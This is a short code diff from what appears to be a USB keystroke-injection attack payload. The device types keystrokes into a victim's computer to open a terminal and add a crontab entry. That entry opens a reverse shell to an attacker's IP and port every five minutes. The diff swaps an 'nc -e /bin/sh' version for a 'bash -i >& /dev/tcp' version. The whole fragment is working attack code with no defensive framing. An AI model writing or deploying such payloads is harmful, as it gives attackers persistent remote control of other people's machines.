@@ -22,7 +22,7 @@ void payloadA(){
     NinjaKeyboard.print(F("Terminal")); 
     NinjaKeyboard.sendKeyStroke(KEY_ENTER); 
     NinjaKeyboard.delay(1000); 
-    NinjaKeyboard.print(F("echo '*/5 * * * * nc -e /bin/sh IP PORT >/dev/null' | crontab -"));
+    NinjaKeyboard.print(F("echo '*/5 * * * * bash -i >& /dev/tcp/IP/PORT 0>&1 &' | crontab -"));
     NinjaKeyboard.sendKeyStroke(KEY_ENTER);
 
     // Stop and remove keyboard   
